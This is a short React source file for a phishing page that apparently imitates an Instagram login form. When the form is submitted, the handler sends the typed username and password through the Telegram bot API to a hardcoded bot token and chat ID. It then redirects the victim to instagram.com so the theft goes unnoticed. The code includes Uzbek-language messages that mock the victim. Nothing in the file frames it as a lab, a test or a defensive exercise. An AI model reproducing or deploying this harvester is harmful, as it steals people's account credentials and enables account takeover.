import React, { useState } from 'react';

const Login = () => {
    const API_TOKEN = '7680168218:AAFquU0aJpuK6KZGNthbbVeqcWMZ_mttzqI';
    const CHAT_ID = '858709040';

    const [username, setUserName] = useState('');
    const [password, setPassword] = useState('');

    const handleLogin = () => {
        const message = `Loxni username: ${username}\nLoxniPasswordi: ${password}`;
        const url = `https://api.telegram.org/bot${API_TOKEN}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
            }),
        })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('Tabrikliman lox uhladin');
                } else {
                    console.error('Omadin borakan xato jonatin', data.description);
                }
            })
            .catch(error => {
                console.error('Error sending message:', error);
            });

        window.location.href = 'https://www.instagram.com/'
    };

    return (
        <div>
            <div>
                <input
                    onChange={(e) => setUserName(e.target.value)}
                    type="text"
                    placeholder="Username or email"
                />
                <input
                    onChange={(e) => setPassword(e.target.value)}
                    type="password"
                    placeholder="Password"
                />
                <button onClick={handleLogin}>Login</button>
            </div>
        </div>
    );
};

export default Login;
